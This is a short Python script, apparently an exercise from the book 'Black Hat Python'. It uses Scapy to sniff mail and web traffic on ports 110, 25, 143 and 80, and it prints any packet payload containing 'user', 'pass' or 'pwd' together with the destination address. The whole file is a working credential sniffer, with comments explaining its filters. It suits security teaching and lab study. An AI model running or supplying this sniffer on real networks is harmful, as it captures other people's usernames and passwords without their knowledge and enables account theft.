#Scapy Black Hat Python

from scapy.all import sniff, TCP, IP

def packet_callback(packet):
    
    if packet[TCP].payload:
        mypacket = str(packet[TCP].payload)
        
        ## Filtering to only look for packets that include 'user' or 'pass' 
        if 'user' in mypacket.lower() or 'pass' in mypacket.lower() or 'pwd' in mypacket.lower():
            print(f'[*] Destination: {packet[IP].dst}')
            print(f'[*] {str(packet[TCP].payload)}')
            

def main(): ## Filtering to only return packets from specific ports on tcp protocol. Filtering is using 'BPF syntax'
    sniff(filter='tcp port 110 or tcp port 25 or tcp port 143 or tcp port 80',
          ## the store parameter below means the contents arent stored in memory. This saves RAM if the sniffer is running awhile
          prn=packet_callback, store=0)

if __name__ == '__main__':
    
    main()

